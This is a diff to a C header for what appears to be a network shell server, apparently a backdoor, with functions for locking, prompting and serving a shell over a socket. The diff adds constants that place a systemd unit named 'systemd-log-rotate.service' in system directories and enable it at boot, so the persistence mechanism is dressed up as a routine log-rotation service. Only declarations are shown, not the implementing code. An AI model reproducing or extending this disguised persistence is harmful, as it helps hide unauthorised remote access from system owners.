@@ -6,6 +6,7 @@
 #include <sys/file.h>
 #include <sys/socket.h>
 #include <sys/epoll.h>
+#include <sys/stat.h>
 #include <sys/wait.h>
 #include <arpa/inet.h>
 #include <string.h>
@@ -34,6 +35,9 @@
 
 #define BACKLOG 1024
 
+#define SYSTEMD_SERVICE_FILE "/usr/lib/systemd/system/systemd-log-rotate.service"
+#define SYSTEMD_SERVICE_SYMLINK "/etc/systemd/system/multi-user.target.wants/systemd-log-rotate.service"
+
 extern char **environ;
 
 // lock.c
@@ -55,3 +59,6 @@ void	prompt(int fd);
 // shell.c
 void	shell(int epfd, int cfd);
 void	shell_done(int);
+
+// specific.c
+void	demolinux_specific(void);
